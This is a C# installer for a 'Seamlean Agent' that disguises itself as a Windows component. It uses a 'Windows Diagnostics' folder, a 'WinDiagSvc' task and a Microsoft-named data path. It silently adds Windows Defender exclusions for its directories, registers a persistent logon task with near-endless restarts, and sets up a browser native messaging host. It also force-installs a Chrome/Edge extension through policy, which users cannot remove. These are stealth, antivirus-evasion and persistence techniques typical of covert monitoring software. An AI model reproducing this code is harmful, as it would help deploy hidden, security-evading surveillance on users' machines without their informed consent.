using System.Diagnostics;
using System.Reflection;
using System.Security.Principal;
using System.Text.Json;
using Microsoft.Win32;

namespace Seamlean.Agent.Installer;

/// <summary>
/// Self-installer / uninstaller.
/// Invoked via: Seamlean.Agent.exe --install [--install-code CODE]
///              Seamlean.Agent.exe --uninstall [--purge]
/// Must run as Administrator. If not, re-launches self via runas verb.
/// </summary>
public static class Installer
{
    private const string TaskName   = "WinDiagSvc";
    private const string InstallDir = @"C:\Program Files\Windows Diagnostics";
    private const string DataDir    = @"%ProgramData%\Microsoft\Diagnostics";
    private const string ExeName    = "Seamlean.Agent.exe";
    private const string RegKeyBase = @"SOFTWARE\WinDiagSvc";

    public static async Task<int> RunAsync(string[] args)
    {
        bool install   = args.Contains("--install");
        bool uninstall = args.Contains("--uninstall");
        bool purge     = args.Contains("--purge");

        var codeArg = Array.IndexOf(args, "--install-code");
        string? installCode = codeArg >= 0 && codeArg + 1 < args.Length ? args[codeArg + 1] : null;

        if (!IsAdmin())
        {
            RelaunchAsAdmin(args);
            return 0;
        }

        if (install)   return await InstallAsync(installCode);
        if (uninstall) return Uninstall(purge);

        Console.WriteLine("Usage: Seamlean.Agent.exe --install [--install-code CODE]");
        Console.WriteLine("       Seamlean.Agent.exe --uninstall [--purge]");
        return 1;
    }

    // -------------------------------------------------------------------------

    private static async Task<int> InstallAsync(string? installCode)
    {
        Console.WriteLine("==> Seamlean Agent Installer");

        var installDir = InstallDir;
        var dataDir    = Environment.ExpandEnvironmentVariables(DataDir);

        // 1. Directories
        Directory.CreateDirectory(installDir);
        Directory.CreateDirectory(dataDir);
        Directory.CreateDirectory(Path.Combine(dataDir, "db"));
        Directory.CreateDirectory(Path.Combine(dataDir, "cache"));
        Directory.CreateDirectory(Path.Combine(dataDir, "logs"));
        Console.WriteLine("    OK: directories created");

        // 2. Copy exe to install dir
        var currentExe = Process.GetCurrentProcess().MainModule?.FileName
            ?? Environment.ProcessPath!;
        var destExe = Path.Combine(installDir, ExeName);
        File.Copy(currentExe, destExe, overwrite: true);
        Console.WriteLine($"    OK: {destExe}");

        // 3. Write appsettings.json from embedded resource (only if not already present)
        var settingsPath = Path.Combine(installDir, "appsettings.json");
        if (!File.Exists(settingsPath))
        {
            var asm = Assembly.GetExecutingAssembly();
            var resourceName = asm.GetManifestResourceNames()
                .FirstOrDefault(n => n.EndsWith("appsettings.json"));
            if (resourceName is not null)
            {
                using var stream = asm.GetManifestResourceStream(resourceName)!;
                using var fs     = File.Create(settingsPath);
                await stream.CopyToAsync(fs);
                Console.WriteLine("    OK: appsettings.json written from embedded resource");
            }
        }

        // 4. Bootstrap profile via install code (before writing registry URL)
        if (!string.IsNullOrEmpty(installCode))
        {
            Console.WriteLine($"    Bootstrap: fetching profile for code {installCode}...");
            await FetchAndStoreBootstrapProfileAsync(installCode);
        }

        // 5. Defender exclusions
        RunSilent("powershell", $"-NonInteractive -Command \"Add-MpPreference -ExclusionPath '{installDir}' -ErrorAction SilentlyContinue\"");
        RunSilent("powershell", $"-NonInteractive -Command \"Add-MpPreference -ExclusionPath '{dataDir}' -ErrorAction SilentlyContinue\"");
        Console.WriteLine("    OK: Defender exclusions added");

        // 6. Scheduled Task (AtLogOn, Interactive, BUILTIN\Users, LimitedAccess)
        RegisterScheduledTask(destExe);
        Console.WriteLine($"    OK: Scheduled Task '{TaskName}' registered");

        // 7. Native Messaging host (Chrome + Edge)
        RegisterNativeMessaging(destExe);
        Console.WriteLine("    OK: Native Messaging host registered");

        // 8. Extension Forcelist (if extension.crx sits next to the exe)
        var crxPath = Path.Combine(Path.GetDirectoryName(currentExe)!, "extension.crx");
        var idPath  = Path.Combine(Path.GetDirectoryName(currentExe)!, "extension-id.txt");
        if (File.Exists(crxPath) && File.Exists(idPath))
        {
            var extId    = File.ReadAllText(idPath).Trim();
            var destCrx  = Path.Combine(installDir, "extension.crx");
            File.Copy(crxPath, destCrx, overwrite: true);
            RegisterExtensionForcelist(extId, destCrx);
            Console.WriteLine($"    OK: Extension {extId} added to Forcelist");
        }

        // 9. Start task
        RunSilent("schtasks", $"/Run /TN \"{TaskName}\"");
        Console.WriteLine("    OK: Task started");

        Console.WriteLine("\nInstallation complete.");
        return 0;
    }

    private static int Uninstall(bool purge)
    {
        Console.WriteLine("==> Seamlean Agent Uninstaller");

        RunSilent("schtasks", $"/End /TN \"{TaskName}\"");
        RunSilent("schtasks", $"/Delete /TN \"{TaskName}\" /F");
        RunSilent("taskkill", $"/F /IM \"{ExeName}\"");
        Console.WriteLine("    OK: Task stopped and deleted");

        var installDir = InstallDir;
        try { Directory.Delete(installDir, recursive: true); }
        catch (Exception ex) { Console.WriteLine($"    WARN: {ex.Message}"); }
        Console.WriteLine($"    OK: {installDir} removed");

        // Remove Native Messaging keys
        RemoveRegistryKey(@"SOFTWARE\Google\Chrome\NativeMessagingHosts\com.windiag.host");
        RemoveRegistryKey(@"SOFTWARE\Microsoft\Edge\NativeMessagingHosts\com.windiag.host");
        Console.WriteLine("    OK: Native Messaging keys removed");

        // Remove extension from Forcelist
        RemoveExtensionFromForcelist();
        Console.WriteLine("    OK: Extension Forcelist entry removed");

        if (purge)
        {
            var dataDir = Environment.ExpandEnvironmentVariables(DataDir);
            try { Directory.Delete(dataDir, recursive: true); }
            catch (Exception ex) { Console.WriteLine($"    WARN: {ex.Message}"); }
            RemoveRegistryKey(RegKeyBase);
            Console.WriteLine("    OK: Data directory and registry purged");
        }

        Console.WriteLine("\nUninstallation complete.");
        return 0;
    }

    // -------------------------------------------------------------------------

    private static async Task FetchAndStoreBootstrapProfileAsync(string installCode)
    {
        using var http = new System.Net.Http.HttpClient();
        http.Timeout = TimeSpan.FromSeconds(30);
        try
        {
            var resp = await http.PostAsync(
                "https://api.seamlean.com/v1/installer/bootstrap",
                new System.Net.Http.StringContent(
                    JsonSerializer.Serialize(new { install_code = installCode }),
                    System.Text.Encoding.UTF8,
                    "application/json"));

            if (!resp.IsSuccessStatusCode)
            {
                Console.WriteLine($"    WARN: Bootstrap fetch failed: {resp.StatusCode}");
                return;
            }

            var json = await resp.Content.ReadAsStringAsync();
            var doc  = JsonDocument.Parse(json);
            var profile = doc.RootElement.GetProperty("profile").GetRawText();

            using var key = Registry.LocalMachine.CreateSubKey(
                Path.Combine(RegKeyBase, "Bootstrap"), writable: true);
            key!.SetValue("ProfileJson", profile, RegistryValueKind.String);
            Console.WriteLine("    OK: Bootstrap profile stored in registry");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"    WARN: Bootstrap fetch error: {ex.Message}");
        }
    }

    private static void RegisterScheduledTask(string exePath)
    {
        // Remove existing task first (idempotent)
        RunSilent("schtasks", $"/Delete /TN \"{TaskName}\" /F");

        var xml = $"""
            <?xml version="1.0" encoding="UTF-16"?>
            <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
              <RegistrationInfo>
                <Description>Windows Diagnostics Service</Description>
              </RegistrationInfo>
              <Triggers>
                <LogonTrigger>
                  <Enabled>true</Enabled>
                  <Delay>PT0H0M30S</Delay>
                </LogonTrigger>
              </Triggers>
              <Principals>
                <Principal id="Author">
                  <GroupId>S-1-5-32-545</GroupId>
                  <RunLevel>LeastPrivilege</RunLevel>
                </Principal>
              </Principals>
              <Settings>
                <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
                <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                <RestartOnFailure>
                  <Interval>PT1M</Interval>
                  <Count>9999</Count>
                </RestartOnFailure>
              </Settings>
              <Actions>
                <Exec>
                  <Command>{exePath}</Command>
                </Exec>
              </Actions>
            </Task>
            """;

        var tmpXml = Path.Combine(Path.GetTempPath(), "WinDiagSvc_task.xml");
        File.WriteAllText(tmpXml, xml, System.Text.Encoding.Unicode);
        RunSilent("schtasks", $"/Create /XML \"{tmpXml}\" /TN \"{TaskName}\" /F");
        File.Delete(tmpXml);
    }

    private static void RegisterNativeMessaging(string exePath)
    {
        var manifest = JsonSerializer.Serialize(new
        {
            name             = "com.windiag.host",
            description      = "Windows Diagnostics Native Host",
            path             = exePath,
            type             = "stdio",
            allowed_origins  = new[] { "chrome-extension://placeholder/" },
        }, new JsonSerializerOptions { WriteIndented = true });

        var manifestPath = Path.Combine(Path.GetDirectoryName(exePath)!, "native-messaging-host.json");
        File.WriteAllText(manifestPath, manifest);

        using var chrome = Registry.LocalMachine.CreateSubKey(
            @"SOFTWARE\Google\Chrome\NativeMessagingHosts\com.windiag.host", writable: true);
        chrome!.SetValue("", manifestPath, RegistryValueKind.String);

        using var edge = Registry.LocalMachine.CreateSubKey(
            @"SOFTWARE\Microsoft\Edge\NativeMessagingHosts\com.windiag.host", writable: true);
        edge!.SetValue("", manifestPath, RegistryValueKind.String);
    }

    private static void RegisterExtensionForcelist(string extId, string crxPath)
    {
        var entry = $"{extId};file:///{crxPath.Replace('\\', '/')}";
        SetForcelistEntry(@"SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist", entry);
        SetForcelistEntry(@"SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist", entry);
    }

    private static void SetForcelistEntry(string keyPath, string entry)
    {
        using var key = Registry.LocalMachine.CreateSubKey(keyPath, writable: true);
        if (key is null) return;
        // Find next available numeric index
        int idx = 1;
        while (key.GetValue(idx.ToString()) != null) idx++;
        key.SetValue(idx.ToString(), entry, RegistryValueKind.String);
    }

    private static void RemoveExtensionFromForcelist()
    {
        RemoveWinDiagFromForcelist(@"SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist");
        RemoveWinDiagFromForcelist(@"SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist");
    }

    private static void RemoveWinDiagFromForcelist(string keyPath)
    {
        using var key = Registry.LocalMachine.OpenSubKey(keyPath, writable: true);
        if (key is null) return;
        foreach (var name in key.GetValueNames())
        {
            var val = key.GetValue(name)?.ToString() ?? "";
            if (val.Contains("windiag") || val.Contains("Windows Diagnostics"))
                key.DeleteValue(name);
        }
    }

    private static void RemoveRegistryKey(string keyPath)
    {
        try { Registry.LocalMachine.DeleteSubKeyTree(keyPath, throwOnMissingSubKey: false); }
        catch { }
    }

    private static void RunSilent(string exe, string args)
    {
        try
        {
            var p = Process.Start(new ProcessStartInfo
            {
                FileName        = exe,
                Arguments       = args,
                UseShellExecute = false,
                CreateNoWindow  = true,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
            });
            p?.WaitForExit(15_000);
        }
        catch { }
    }

    private static bool IsAdmin()
    {
        using var id = WindowsIdentity.GetCurrent();
        return new WindowsPrincipal(id).IsInRole(WindowsBuiltInRole.Administrator);
    }

    private static void RelaunchAsAdmin(string[] args)
    {
        var exe = Process.GetCurrentProcess().MainModule?.FileName
            ?? Environment.ProcessPath!;
        Process.Start(new ProcessStartInfo
        {
            FileName        = exe,
            Arguments       = string.Join(" ", args),
            UseShellExecute = true,
            Verb            = "runas",
        });
    }
}
